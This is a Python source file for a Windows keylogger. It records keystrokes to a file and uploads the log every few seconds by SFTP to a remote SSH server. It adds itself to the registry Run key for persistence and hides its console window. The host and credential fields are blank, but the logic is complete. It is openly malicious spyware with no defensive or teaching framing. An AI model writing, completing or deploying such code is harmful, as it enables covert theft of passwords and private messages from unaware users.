import time
import atexit
import keyboard
import threading
import paramiko
import winreg
import os
import sys
import win32gui
import win32con


keylogger_file = ""
#keep this var empty
word = ""
ssh_host = ""
ssh_port = ""
ssh_username = ""
ssh_password = ""
#location of file in local machine
local_file_path = ""
#location of file in ssh server
remote_file_path = ""

#capture keystokes
def on_keys_press(event):
    global word
    with open(keylogger_file, 'a') as f:
        if event.name == 'space':
            f.write(word+" ")
            word=""
        elif event.name == 'enter':
            f.write(word+"\n")
            word=""
        #erase when user erases
        elif event.name == 'backspace':
            word = word[:-1]
        #get key no matter what key
        elif len(event.name) == 1 and event.name.isprintable():
            word+=event.name

#even if user CTRL+C it will save last word
def get_last_word():
    global word
    if word:
        with open(keylogger_file, 'a') as f:
            f.write(word)


def send_file(host,port,username,password,local_file_path,remote_file_path):
    #opens ssh connection
    while True:
        #time
        time.sleep(5)
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host,port=port,username=username,password=password)
            #creates sftp to upload the file
            sftp = ssh.open_sftp()
            sftp.put(local_file_path, remote_file_path)
            #closes connection
            sftp.close()
            ssh.close()
        except:
            pass

def add_to_startup():
    try:
        # get path of script
        script_path = os.path.abspath(sys.argv[0])
        
        # open the registry key for startup programs
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            "Software\\Microsoft\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_SET_VALUE
        )
        
        # Add the program to startup
        winreg.SetValueEx(key, sys.argv[0], 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        return False


def main():
    # hide console window pop up
    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
    
    # add to startup if not already there
    add_to_startup()
    
    atexit.register(get_last_word)
    while True:
        threading.Thread(target=send_file, args=(ssh_host, ssh_port, ssh_username, ssh_password, local_file_path, remote_file_path), daemon=True).start()
        try:
            keyboard.on_press(on_keys_press)
            keyboard.wait()
        except KeyboardInterrupt:
            get_last_word()



if __name__ == "__main__":
    main()